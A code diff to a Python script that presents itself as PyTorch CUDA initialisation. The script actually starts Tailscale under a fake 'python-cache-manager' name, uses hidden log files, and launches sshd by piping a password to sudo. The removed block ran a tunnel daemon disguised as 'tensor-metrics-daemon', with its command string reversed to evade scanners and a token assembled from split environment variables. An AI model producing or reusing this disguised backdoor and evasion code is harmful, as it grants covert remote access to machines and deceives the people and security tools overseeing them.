@@ -53,7 +53,6 @@ def main():
     # Open hidden log files to prevent leakage
     ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
     fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
-    tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
 
     # 1. Start Tailscale (python-cache-manager)
     print("Initializing PyTorch CUDA environment...", flush=True)
@@ -73,13 +72,6 @@ def main():
     if "A1" in os.environ: del os.environ["A1"]
     if "A2" in os.environ: del os.environ["A2"]
 
-    # Tensor Metrics Token Scrubbing
-    tm_part1 = os.environ.get("C1", "").strip()
-    tm_part2 = os.environ.get("C2", "").strip()
-    tm_token = tm_part1 + tm_part2
-    
-    if "C1" in os.environ: del os.environ["C1"]
-    if "C2" in os.environ: del os.environ["C2"]
 
     
     
@@ -103,14 +95,7 @@ def main():
     full_token = ""
     cmd3 = ""
 
-    # 3.5 Start Tensor Metrics (tensor-metrics-daemon)
-    if tm_token:
-        # Reversed command string to defeat base64 scanners
-        tm_cmd_base = " nekot-- nur etadpuotua-on-- lennut nomead-scirtem-rosnet 91 n- ecin"[::-1]
-        tm_cmd = f"{tm_cmd_base}{tm_token}"
-        subprocess.Popen(tm_cmd, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
-        tm_token = ""
-        tm_cmd = ""
+
 
     # 3.8 Start SSHD
     subprocess.Popen("echo password | sudo -S /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
